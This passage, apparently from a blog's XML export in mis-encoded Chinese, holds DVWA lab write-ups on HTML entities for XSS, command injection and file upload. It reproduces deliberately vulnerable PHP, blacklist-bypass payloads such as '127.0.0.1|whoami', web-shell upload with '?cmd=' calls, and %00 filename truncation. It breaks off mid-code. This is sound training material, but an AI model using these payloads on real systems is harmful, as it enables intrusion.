æ‹¿æ¥é…åˆCRLFè¿›è¡ŒXSSä¼šå¾ˆèˆ’æœ æ³¨æ„å¤´éƒ¨çš„X-XSS-Protectionè¿™ä¸ªä¸œè¥¿å°±æ˜¯è®©æµè§ˆå™¨å¸®åŠ©ä¸€èµ·é˜²å¾¡XSS ä¸º0åˆ™ä¸å¸®åŠ©ï¼Œä¸º1åˆ™æŠŠå¯èƒ½å«æœ‰çš„åœ¨ä»£ç ä¸­ç›´æŽ¥æ‹¿æŽ‰ï¼Œè¿˜æœ‰ä¸€ä¸ªæ˜¯ç±»åž‹1;blackè¿™æ ·çš„ï¼Œå°±æ˜¯åœ¨urlåœ°å€ç›´æŽ¥æŠŠè®¤ä¸ºå¯èƒ½æ˜¯xssçš„æ‹¿æŽ‰ï¼Œæ‰€ä»¥æœ‰æ—¶å€™å¹¶ä¸æ˜¯ä½ çš„XSSä»£ç è¢«æœåŠ¡å™¨è¿‡æ»¤äº†ï¼Œè¿˜æœ‰å¯èƒ½æ˜¯è¢«æµè§ˆå™¨æ‹¿èµ°äº† HTML Entityä»‹ç»åœ¨ç¼–å†™HTMLé¡µé¢æ—¶ï¼Œéœ€è¦ç”¨åˆ°â€&lt;â€ã€â€&gt;â€ã€â€ç©ºæ ¼â€ç­‰ç¬¦å·ï¼Œç›´æŽ¥è¾“å…¥è¿™äº›ç¬¦å·æ—¶ï¼Œä¼šé”™è¯¯çš„æŠŠå®ƒä»¬ä¸Žæ ‡è®°æ··åœ¨ä¸€èµ·ï¼Œéžå¸¸ä¸åˆ©äºŽç¼–ç ã€‚ é‚£ä¹ˆå°±éœ€è¦æŠŠè¿™äº›å­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œä»¥å¦ä¸€ç§æ–¹å¼æŠ’å†™ï¼Œä»¥ç›¸åŒçš„å½¢å¼å±•çŽ°ã€‚ åœ¨HTMLä¸­ï¼Œè¿™äº›å­—ç¬¦å¯ç§°ä¸ºHTML Entityï¼Œå³HTML å­—ç¬¦å®žä½“ã€‚ä¸€ä¸ªHTML Entityéƒ½å«æœ‰2ç§è½¬ä¹‰æ ¼å¼ï¼šEntity Name å’Œ Entity Numberã€‚ Entity Nameæ ¼å¼ï¼š &entityName; è¯´æ˜Žï¼šâ€&amp;â€å¼€å¤´ï¼Œâ€;â€ç»“å°¾ï¼Œä»¥è¯­ä¹‰çš„å½¢å¼æè¿°å­—ç¬¦ã€‚å¦‚å­—ç¬¦â€&lt;â€ï¼Œè‹±æ–‡åç§°ä¸ºâ€less thanâ€ï¼ŒEntity Nameä¸ºâ€&lt;â€ï¼Œå–è‡ªâ€less thanâ€2ä¸ªå•è¯çš„é¦–å­—æ¯ã€‚ Entity Numberæ ¼å¼ï¼š &#entityNumber; è¯´æ˜Žï¼šâ€&amp;#â€å¼€å¤´ï¼Œâ€;â€ç»“å°¾ï¼Œä»¥ç¼–å·çš„å½¢å¼æè¿°å­—ç¬¦ã€‚æ­¤ç¼–å·å¯ä»¥ä¸ºåè¿›åˆ¶æˆ–åå…­è¿›åˆ¶(ä»¥â€&amp;#xâ€å¼€å¤´)ç­‰æ•°å­—æ ¼å¼ã€‚ ç¤ºä¾‹&lt;p&gt;å­—ç¬¦ ï¼š&lt;&lt;/p&gt; &lt;p&gt;Entity Name ï¼š&amp;lt;&lt;/p&gt; &lt;p&gt;Entity Number(åè¿›åˆ¶) ï¼š&amp;#60;&lt;/p&gt; &lt;p&gt;Entity Number(åå…­è¿›åˆ¶) ï¼š&amp;#x3c;&lt;/p&gt; Character Character Entity Entity Number(åè¿›åˆ¶) Entity Number(åå…­è¿›åˆ¶) &amp;nbsp; &amp;#32; &amp;#x ! &amp;excl; &amp;#33; &amp;#x21 &quot; &amp;quot; &amp;#34; &amp;#x22 # &amp;num; &amp;#35; &amp;#x23 $ &amp;dollar; &amp;#36; &amp;#x24 % &amp;percnt; &amp;#37; &amp;#x25 &amp; &amp;amp; &amp;#38; &amp;#x26 &apos; &amp;apos; &amp;#39; &amp;#x27 ( &amp;lpar; &amp;#40; &amp;#x28 ) &amp;rpar; &amp;#41; &amp;#x29 * &amp;ast; &amp;#42; &amp;#x2A + &amp;plus; &amp;#43; &amp;#x2B , &amp;comma; &amp;#44; &amp;#x2C - &amp;hyphen; &amp;#45; &amp;#x2D . &amp;period; &amp;#46; &amp;#x2E / &amp;sol; &amp;#47; &amp;#x2F : &amp;colon; &amp;#58; &amp;#x3A ; &amp;semi; &amp;#59; &amp;#x3B &lt; &amp;lt; &amp;#60; &amp;#x3C = &amp;equals; &amp;#61; &amp;#x3D &gt; &amp;gt; &amp;#62; &amp;#x3E ? &amp;quest; &amp;#63; &amp;#x3F @ &amp;commat; &amp;#64; &amp;#x40 [ &amp;lsqb; &amp;#91; &amp;#x5B \ &amp;bsol; &amp;#92; &amp;#x5C ] &amp;rsqb; &amp;#93; &amp;#x5D ^ &amp;circ; &amp;#94; &amp;#x5E _ &amp;lowbar; &amp;#95; &amp;#x5F ` &amp;grave; &amp;#96; &amp;#x60 { &amp;lcub; &amp;#123; &amp;#x7B | &amp;verbar; &amp;#124; &amp;#x7C } &amp;rcub; &amp;#125; &amp;#x7D ~ &amp;tilde; &amp;#126; &amp;#x7E å‚è€ƒäº†è§£XSSæ”»å‡» SVG XSSçš„ä¸€ä¸ªé»‘é­”æ³• å¯ä»¥è¢«XSSåˆ©ç”¨çš„HTMLæ ‡ç­¾å’Œä¸€äº›æ‰‹æ®µæŠ€å·§ HTML Entityå­—ç¬¦å®žä½“ HTML Entity å­—ç¬¦å¯¹ç…§è¡¨]]></content>
      <tags>
        <tag>practice</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA-File_Injection]]></title>
    <url>%2F2018%2F07%2F31%2FDVWA-Command_Injection%2F</url>
    <content type="text"><![CDATA[å‘½ä»¤æ³¨å…¥ä»‹ç»Command Injectionï¼Œå³å‘½ä»¤æ³¨å…¥ï¼Œæ˜¯æŒ‡é€šè¿‡æäº¤æ¶æ„æž„é€ çš„å‚æ•°ç ´åå‘½ä»¤è¯­å¥ç»“æž„ï¼Œä»Žè€Œè¾¾åˆ°æ‰§è¡Œæ¶æ„å‘½ä»¤çš„ç›®çš„ã€‚ LowCommand Injection Source&lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) { // Get input $target = $_REQUEST[ &apos;ip&apos; ]; // Determine OS and execute the ping command. if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) { // Windows $cmd = shell_exec( &apos;ping &apos; . $target ); } else { // *nix $cmd = shell_exec( &apos;ping -c 4 &apos; . $target ); } // Feedback for the end user echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt; åˆ†æžtristr(string,search,before_search) stristrå‡½æ•°æœç´¢å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­çš„ç¬¬ä¸€æ¬¡å‡ºçŽ°ï¼Œè¿”å›žå­—ç¬¦ä¸²çš„å‰©ä½™éƒ¨åˆ†ï¼ˆä»ŽåŒ¹é…ç‚¹ï¼‰ï¼Œå¦‚æžœæœªæ‰¾åˆ°æ‰€æœç´¢çš„å­—ç¬¦ä¸²ï¼Œåˆ™è¿”å›ž FALSEã€‚å‚æ•°stringè§„å®šè¢«æœç´¢çš„å­—ç¬¦ä¸²ï¼Œå‚æ•°searchè§„å®šè¦æœç´¢çš„å­—ç¬¦ä¸²ï¼ˆå¦‚æžœè¯¥å‚æ•°æ˜¯æ•°å­—ï¼Œåˆ™æœç´¢åŒ¹é…è¯¥æ•°å­—å¯¹åº”çš„ ASCII å€¼çš„å­—ç¬¦ï¼‰ï¼Œå¯é€‰å‚æ•°before_trueä¸ºå¸ƒå°”åž‹ï¼Œé»˜è®¤ä¸ºâ€œfalseâ€ ï¼Œå¦‚æžœè®¾ç½®ä¸º â€œtrueâ€ï¼Œå‡½æ•°å°†è¿”å›ž search å‚æ•°ç¬¬ä¸€æ¬¡å‡ºçŽ°ä¹‹å‰çš„å­—ç¬¦ä¸²éƒ¨åˆ†ã€‚ php_uname(mode) è¿™ä¸ªå‡½æ•°ä¼šè¿”å›žè¿è¡Œphpçš„æ“ä½œç³»ç»Ÿçš„ç›¸å…³æè¿°ï¼Œå‚æ•°modeå¯å–å€¼â€aâ€ ï¼ˆæ­¤ä¸ºé»˜è®¤ï¼ŒåŒ…å«åºåˆ—â€s n r v mâ€é‡Œçš„æ‰€æœ‰æ¨¡å¼ï¼‰ï¼Œâ€s â€ï¼ˆè¿”å›žæ“ä½œç³»ç»Ÿåç§°ï¼‰ï¼Œâ€nâ€ï¼ˆè¿”å›žä¸»æœºåï¼‰ï¼Œâ€ râ€ï¼ˆè¿”å›žç‰ˆæœ¬åç§°ï¼‰ï¼Œâ€vâ€ï¼ˆè¿”å›žç‰ˆæœ¬ä¿¡æ¯ï¼‰ï¼Œ â€mâ€ï¼ˆè¿”å›žæœºå™¨ç±»åž‹ï¼‰ã€‚ æœåŠ¡å™¨é€šè¿‡åˆ¤æ–­æ“ä½œç³»ç»Ÿæ‰§è¡Œä¸åŒpingå‘½ä»¤ï¼Œä½†æ˜¯å¯¹ipå‚æ•°å¹¶æœªåšä»»ä½•çš„è¿‡æ»¤ï¼Œå¯¼è‡´äº†ä¸¥é‡çš„å‘½ä»¤æ³¨å…¥æ¼æ´ž æ¼æ´žåˆ©ç”¨windowå’Œlinuxç³»ç»Ÿéƒ½å¯ä»¥ç”¨&amp;&amp;æ¥æ‰§è¡Œå¤šæ¡å‘½ä»¤ æ³¨æ„ï¼šå¦‚æžœåœ¨pingå‘½ä»¤åŽä½¿ç”¨&amp;&amp;å·ä½†æ²¡æœ‰ç»™pingå‘½ä»¤è¾“å…¥IPåœ°å€æ—¶ï¼Œè¿™æ—¶å€™å°†ä¸ä¼šè¿”å›žä»»ä½•å€¼ï¼Œå› ä¸º&amp;&amp;å·åŽé¢å‘½ä»¤æ˜¯å»ºç«‹åœ¨å‰é¢å‘½ä»¤å·²ç»æ­£ç¡®æ‰§è¡Œçš„å‰æä¹‹ä¸‹çš„ï¼Œå¦å¤–ä¹Ÿæœ‰ä¸¤ä¸ªç®¡é“ç¬¦ï¼ˆ||ï¼‰çš„ç”¨æ³•ï¼Œä½†æ˜¯æ¡ä»¶æ˜¯å‰é¢çš„å‘½ä»¤æ‰§è¡Œå¤±è´¥ï¼Œå’Œ&amp;&amp;å·çš„ç›¸å 127.0.0.1&amp;&amp;net user ç”±äºŽç¼–ç çš„é—®é¢˜ï¼Œå¯èƒ½çœ‹åˆ°çš„æ˜¯ä¹±ç ï¼Œä½†æ˜¯åœ¨æºä»£ç ä¸­å¯ä»¥çœ‹åˆ° 127.0.0.1&amp;&amp;whoami 127.0.0.1&amp;&amp;net localgroup administrators MiddleCommand Injection Source&lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) { // Get input $target = $_REQUEST[ &apos;ip&apos; ]; // Set blacklist $substitutions = array( &apos;&amp;&amp;&apos; =&gt; &apos;&apos;, &apos;;&apos; =&gt; &apos;&apos;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) { // Windows $cmd = shell_exec( &apos;ping &apos; . $target ); } else { // *nix $cmd = shell_exec( &apos;ping -c 4 &apos; . $target ); } // Feedback for the end user echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt; åˆ†æžå°† &amp;&amp; å’Œ ; æ›¿æ¢æˆäº†ç©ºå­—ç¬¦ï¼Œæœ¬è´¨ä¸Šé‡‡ç”¨çš„æ˜¯é»‘åå•æœºåˆ¶,ä½†æ˜¯æˆ‘ä»¬è¿˜å¯ä»¥ç”¨&amp;å·ã€ç®¡é“ç¬¦|ç­‰ç›´æŽ¥ç»•è¿‡ &amp;å·ä¸Ž&amp;&amp;å·ä¸åŒï¼Œå› ä¸ºæ˜¯åŒæ—¶æ‰§è¡Œï¼Œæ‰€ä»¥å¹¶ä¸å­˜åœ¨å‰é¢çš„å‘½ä»¤å¿…é¡»æ‰§è¡Œäº†åŽé¢çš„å‘½ä»¤æ‰èƒ½æ‰§è¡Œçš„é—®é¢˜ã€‚ä¾‹å­ä¸­ä¸è¾“å…¥IPåœ°å€ä¹Ÿèƒ½æ‰§è¡ŒåŽé¢çš„å‘½ä»¤ï¼š ç®¡é“ç¬¦èƒ½æ­£å¸¸æ‰§è¡Œï¼Œä½†ç®¡é“ç¬¦çš„é™åˆ¶æ˜¯åªæ˜¾ç¤ºåŽé¢é‚£æ¡å‘½ä»¤çš„æ‰§è¡Œç»“æžœï¼š æ¼æ´žåˆ©ç”¨åˆ©ç”¨æ–¹å¼1127.0.0.1&amp;net user 127.0.0.1|whoami åˆ©ç”¨æ–¹å¼2å› ä¸ºä¼šè¿‡æ»¤æŽ‰ &amp;&amp; å’Œ ; å¦‚æžœæˆ‘ä»¬ç‹—é€ æˆ &amp;;&amp; â€”â€“&gt; &amp;&amp; 127.0.0.1&amp;;&amp;ipconfig HighCommand Injection Source&lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) { // Get input $target = trim($_REQUEST[ &apos;ip&apos; ]); // Set blacklist $substitutions = array( &apos;&amp;&apos; =&gt; &apos;&apos;, &apos;;&apos; =&gt; &apos;&apos;, &apos;| &apos; =&gt; &apos;&apos;, &apos;-&apos; =&gt; &apos;&apos;, &apos;$&apos; =&gt; &apos;&apos;, &apos;(&apos; =&gt; &apos;&apos;, &apos;)&apos; =&gt; &apos;&apos;, &apos;`&apos; =&gt; &apos;&apos;, &apos;||&apos; =&gt; &apos;&apos;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) { // Windows $cmd = shell_exec( &apos;ping &apos; . $target ); } else { // *nix $cmd = shell_exec( &apos;ping -c 4 &apos; . $target ); } // Feedback for the end user echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt; åˆ†æžå…³é”®ä»£ç  &apos;&amp;&apos; =&gt; &apos;&apos;, &apos;;&apos; =&gt; &apos;&apos;, &apos;| &apos; =&gt; &apos;&apos;, &apos;-&apos; =&gt; &apos;&apos;, &apos;$&apos; =&gt; &apos;&apos;, &apos;(&apos; =&gt; &apos;&apos;, &apos;)&apos; =&gt; &apos;&apos;, &apos;`&apos; =&gt; &apos;&apos;, &apos;||&apos; =&gt; &apos;&apos;, è¿™é‡Œè¿›ä¸€æ­¥å®Œå–„äº†é»‘åå•æœºåˆ¶ï¼Œä½†æ˜¯ä»”ç»†çœ‹ï¼Œä¼šå‘çŽ°ç¬¬ä¸‰ä¸ªæ˜¯å°†â€™| â€˜æ›¿æ¢ä¸ºç©ºæ ¼ï¼Œå¯ä»¥çœ‹åˆ°åœ¨ç®¡é“ç¬¦åŽé¢è¿˜æœ‰ä¸€ä¸ªç©ºæ ¼ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ â€˜ |â€™å°†ç©ºæ ¼æ”¾åˆ°å‰é¢æ¥ç»•è¿‡,æˆ–è€…åœ¨ | å‰åŽä¸ç•™æœ‰ç©ºæ ¼ â€œ|â€æ˜¯ç®¡é“ç¬¦ï¼Œè¡¨ç¤ºå°†Command 1çš„è¾“å‡ºä½œä¸ºCommand 2çš„è¾“å…¥ï¼Œå¹¶ä¸”åªæ‰“å°Command 2æ‰§è¡Œçš„ç»“æžœ æ¼æ´žåˆ©ç”¨127.0.0.1 |net user 127.0.0.1|dir ImossibleCommand Injection Source&lt;?php if( isset( $_POST[ &apos;Submit&apos; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Get input $target = $_REQUEST[ &apos;ip&apos; ]; $target = stripslashes( $target ); // Split the IP into 4 octects $octet = explode( &quot;.&quot;, $target ); // Check IF each octet is an integer if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) { // If all 4 octets are int&apos;s put the IP back together. $target = $octet[0] . &apos;.&apos; . $octet[1] . &apos;.&apos; . $octet[2] . &apos;.&apos; . $octet[3]; // Determine OS and execute the ping command. if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) { // Windows $cmd = shell_exec( &apos;ping &apos; . $target ); } else { // *nix $cmd = shell_exec( &apos;ping -c 4 &apos; . $target ); } // Feedback for the end user echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } else { // Ops. Let the user name theres a mistake echo &apos;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&apos;; } } // Generate Anti-CSRF token generateSessionToken(); ?&gt; stripslashes(string) stripslasheså‡½æ•°ä¼šåˆ é™¤å­—ç¬¦ä¸²stringä¸­çš„åæ–œæ ï¼Œè¿”å›žå·²å‰¥ç¦»åæ–œæ çš„å­—ç¬¦ä¸²ã€‚ explode(separator,string,limit) æŠŠå­—ç¬¦ä¸²æ‰“æ•£ä¸ºæ•°ç»„ï¼Œè¿”å›žå­—ç¬¦ä¸²çš„æ•°ç»„ã€‚å‚æ•°separatorè§„å®šåœ¨å“ªé‡Œåˆ†å‰²å­—ç¬¦ä¸²ï¼Œå‚æ•°stringæ˜¯è¦åˆ†å‰²çš„å­—ç¬¦ä¸²ï¼Œå¯é€‰å‚æ•°limitè§„å®šæ‰€è¿”å›žçš„æ•°ç»„å…ƒç´ çš„æ•°ç›®ã€‚ is_numeric(string) æ£€æµ‹stringæ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ï¼Œå¦‚æžœæ˜¯è¿”å›žTRUEï¼Œå¦åˆ™è¿”å›žFALSE åˆ†æžå…³é”®éƒ¨åˆ† checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); ä½¿ç”¨csrfé˜²èŒƒæœºåˆ¶ï¼Œæ£€æŸ¥å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯çš„tokenæ˜¯å¦ç›¸åŒ $target = stripslashes( $target ); å°†å˜é‡çš„å€¼è¿›è¡Œå®žä½“åŒ– $octet = explode( &quot;.&quot;, $target ); å°†IPåœ°å€åˆ†å‰²æˆå››éƒ¨åˆ†ï¼Œå¹¶ä¸”æ£€æŸ¥æ˜¯å¦æ˜¯æ•°å­—ï¼Œè€Œä¸”é•¿åº¦æ˜¯å¦ä¸ºå››ï¼Œç„¶åŽå°†è¿™å››éƒ¨åˆ†è¿žæŽ¥èµ·æ¥]]></content>
      <tags>
        <tag>DVWA</tag>
        <tag>practice</tag>
        <tag>File_Injection</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA-File_Upload]]></title>
    <url>%2F2018%2F07%2F30%2FDVWA-File_Upload%2F</url>
    <content type="text"><![CDATA[Vulnerability: File UploadIntruduceæ–‡ä»¶ä¸Šä¼ æ¼æ´ž å½¢æˆçš„ä¸»å› ï¼šç”±äºŽå¯¹ä¸Šä¼ æ–‡ä»¶ç±»åž‹æœªéªŒè¯æˆ–è¿‡æ»¤æœºåˆ¶ä¸ä¸¥ï¼Œå¯¼è‡´æ¶æ„ç”¨æˆ·å¯ä»¥ä¸Šä¼ è„šæœ¬æ–‡ä»¶ï¼Œé€šè¿‡ä¸Šä¼ æ–‡ä»¶å¯è¾¾åˆ°æŽ§åˆ¶ç½‘ç«™æƒé™çš„ç›®çš„ å±å®³:æ”»å‡»è€…å¯èŽ·å¾—ç½‘ç«™æŽ§åˆ¶æƒé™,æŸ¥çœ‹ã€ä¿®æ”¹ã€åˆ é™¤ç½‘ç«™æ•°æ®,é€šè¿‡ææƒæ¼æ´žå¯èŽ·å¾—ä¸»æœºæƒé™ ä¸Šä¼ ç‚¹ï¼šå¤´åƒã€é™„ä»¶ã€åŽå°æ–°é—»ç¼–è¾‘ç­‰ç­‰ åˆ©ç”¨æ¡ä»¶æˆåŠŸä¸Šä¼ æœ¨é©¬æ–‡ä»¶ æœ¨é©¬æ–‡ä»¶èƒ½å¤Ÿæ‰§è¡Œ ä¸Šä¼ è·¯å¾„å¯çŸ¥ ä¸Šä¼ æ£€æŸ¥æ–¹å¼A å®¢æˆ·ç«¯javascript æ£€æµ‹(é€šå¸¸ä¸ºæ£€æµ‹æ–‡ä»¶æ‰©å±•å) B æœåŠ¡ç«¯MIME ç±»åž‹æ£€æµ‹(æ£€æµ‹Content-Type å†…å®¹) C æœåŠ¡ç«¯ç›®å½•è·¯å¾„æ£€æµ‹(æ£€æµ‹è·Ÿpath å‚æ•°ç›¸å…³çš„å†…å®¹) D æœåŠ¡ç«¯æ–‡ä»¶æ‰©å±•åæ£€æµ‹(æ£€æµ‹è·Ÿæ–‡ä»¶extension ç›¸å…³çš„å†…å®¹) E æœåŠ¡ç«¯æ–‡ä»¶å†…å®¹æ£€æµ‹(æ£€æµ‹å†…å®¹æ˜¯å¦åˆæ³•æˆ–å«æœ‰æ¶æ„ä»£ç ) å¸¸è§ä¸Šä¼ æ¼æ´žå¯¹æ–‡ä»¶ç±»åž‹æ— ä»»ä½•éªŒè¯å¯ç›´æŽ¥ä¸Šä¼ ç›¸åº”è„šæœ¬æ–‡ä»¶ æœ¬åœ°javascriptæ‰©å±•åæ ¡éªŒä¸€åˆ‡åœ¨å®¢æˆ·ç«¯çš„æ ¡éªŒéƒ½æ˜¯ä¼ªæ ¡éªŒ ä½¿ç”¨é»‘åå•orç™½åå•æ‰©å±•åå®šä¹‰æ–¹å¼å¯¹æ¯” ä¸Šä¼ æ–‡ä»¶æœªè¿›è¡Œé‡å‘½åç»“åˆwebåº”ç”¨è§£æžæ¼æ´ž å®¢æˆ·ç«¯å¯æŽ§åˆ¶ä¸Šä¼ å‚æ•°éƒ¨åˆ†æ•æ„Ÿä¸Šä¼ å‚æ•°åœ¨å®¢æˆ·ç«¯å¯æŽ§ æ•°æ®åº“å¤‡ä»½å¯é€šè¿‡å¤‡ä»½åŠŸèƒ½ä¿®æ”¹æ–‡ä»¶åŽç¼€ æ£€æµ‹ç»•è¿‡æ£€æµ‹ç»•è¿‡ åœæ­¢å®¢æˆ·ç«¯æ£€æµ‹è„šæœ¬ MIMEç±»åž‹æ£€æµ‹ç»•è¿‡ é»‘åå•åˆ—è¡¨ç»•è¿‡ ç‰¹æ®Šæ–‡ä»¶åç»•è¿‡ åˆ©ç”¨æˆªæ–­ åˆ©ç”¨è§£æžæ¼æ´ž åˆ©ç”¨.htaccessæ–‡ä»¶ å¯ä¿®æ”¹ä¸Šä¼ æ–‡ä»¶ é»‘åå•æ£€æµ‹ç»•è¿‡1. æ–‡ä»¶åå¤§å°å†™ç»•è¿‡ç”¨AsPï¼ŒpHpä¹‹ç±»çš„æ–‡ä»¶åç»•è¿‡é»‘åå•æ£€æµ‹ã€‚ 2. åå•åˆ—è¡¨ç»•è¿‡ç”¨é»‘åå•é‡Œæ²¡æœ‰çš„åå•è¿›è¡Œæ”»å‡»ï¼Œæ¯”å¦‚é»‘åå•é‡Œé¢æ²¡æœ‰asaæˆ–è€…cerä¹‹ç±»ã€‚ 3. 0x00æˆªæ–­ç»•è¿‡ä¾‹å¦‚ï¼šhelp.asp .jpg(aspåŽé¢ä¸º0x00)ï¼Œåœ¨åˆ¤æ–­æ—¶ï¼Œå¤§å¤šå‡½æ•°å–åŽç¼€åæ˜¯ä»ŽåŽå¾€å‰å–ï¼Œæ•…èƒ½å¤Ÿé€šè¿‡ï¼Œä½†æ˜¯åœ¨ä¿å­˜æ—¶ï¼Œå´è¢«ä¿å­˜ä¸ºhelp.aspã€‚ 4. .htaccessæ–‡ä»¶æ”»å‡»é…åˆåå•åˆ—è¡¨ç»•è¿‡ï¼Œä¸Šä¼ ä¸€ä¸ªè‡ªå®šä¹‰çš„.htaccessã€‚ Low File Upload Source&lt;?php if( isset( $_POST[ &apos;Upload&apos; ] ) ) { // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] ); // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ], $target_path ) ) { // No echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; } else { // Yes! echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; } } ?&gt; åˆ†æžbasename() å‡½æ•°è¿”å›žè·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†ã€‚ PHP çš„å…¨å±€æ•°ç»„ $_FILESï¼Œä½ å¯ä»¥ä»Žå®¢æˆ·è®¡ç®—æœºå‘è¿œç¨‹æœåŠ¡å™¨ä¸Šä¼ æ–‡ä»¶ã€‚ ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¡¨å•çš„ input nameï¼Œç¬¬äºŒä¸ªä¸‹æ ‡å¯ä»¥æ˜¯ &quot;name&quot;ã€&quot;type&quot;ã€&quot;size&quot;ã€&quot;tmp_name&quot; æˆ– &quot;error&quot;ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼š $_FILES[&quot;file&quot;][&quot;name&quot;] - ä¸Šä¼ æ–‡ä»¶çš„åç§° $_FILES[&quot;file&quot;][&quot;type&quot;] - ä¸Šä¼ æ–‡ä»¶çš„ç±»åž‹ $_FILES[&quot;file&quot;][&quot;size&quot;] - ä¸Šä¼ æ–‡ä»¶çš„å¤§å°ï¼Œä»¥å­—èŠ‚è®¡ $_FILES[&quot;file&quot;][&quot;tmp_name&quot;] - å­˜å‚¨åœ¨æœåŠ¡å™¨çš„æ–‡ä»¶çš„ä¸´æ—¶å‰¯æœ¬çš„åç§° $_FILES[&quot;file&quot;][&quot;error&quot;] - ç”±æ–‡ä»¶ä¸Šä¼ å¯¼è‡´çš„é”™è¯¯ä»£ç  å¯¹äºŽä¸Šä¼ çš„æ–‡ä»¶æ²¡æœ‰åšä»»ä½•è¿‡æ»¤ æ¼æ´žåˆ©ç”¨ç›´æŽ¥ä¸Šä¼ ä¸€å¥è¯ ../../hackable/uploads/shell_exe.php http://192.168.10.11/dvwa/hackable/uploads/shell_exe.php http://192.168.10.11/dvwa/hackable/uploads/shell_exe.php?cmd=ipconfig æ‰¾åˆ°è·¯å¾„å¹¶åˆ©ç”¨ ä¼ ä¸€å¥è¯è¿žæŽ¥èœåˆ€ MiddleFile Upload Source&lt;?php if( isset( $_POST[ &apos;Upload&apos; ] ) ) { // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] ); // File information $uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ]; $uploaded_type = $_FILES[ &apos;uploaded&apos; ][ &apos;type&apos; ]; $uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ]; // Is it an image? if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) { // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ], $target_path ) ) { // No echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; } else { // Yes! echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; } } else { // Invalid file echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;; } } ?&gt; åˆ†æžå…³é”®ä»£ç éƒ¨åˆ† ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) è¿™é‡Œå¯¹æ–‡ä»¶ç±»åž‹äº†æ–‡ä»¶å¤§å°åšäº†æ£€æŸ¥ï¼Œè¦æ±‚Content-Typeå­—æ®µä¸ºimage/jpeg æˆ– image/png ï¼Œå†…å®¹çš„å¤§å°å°äºŽ 100000 æ¼æ´žåˆ©ç”¨æŠ“åŒ…åŽå°†Content_Typeå­—æ®µæ”¹ä¸ºimage/jpegå³å¯ é‡‡ç”¨%00æˆªæ–­åœ¨phpç‰ˆæœ¬å°äºŽ5.3.4çš„ç‰ˆæœ¬ä¸­ï¼Œå½“Magic_quote_gpcé€‰é¡¹ä¸ºoffæ—¶ï¼Œå¯ä»¥åœ¨æ–‡ä»¶åä¸­ä½¿ç”¨%00æˆªæ–­ï¼Œæ‰€ä»¥å¯ä»¥æŠŠä¸Šä¼ æ–‡ä»¶å‘½åa1.php%00.pngè¿›è¡Œç»•è¿‡ HighFile Upload Source&lt;?php if( isset( $_POST[ &apos;Upload&apos; ] ) ) { // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] ); // File information $uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1); $uploaded_size = $_FILES[ &apos;uploaded&apos; ][ 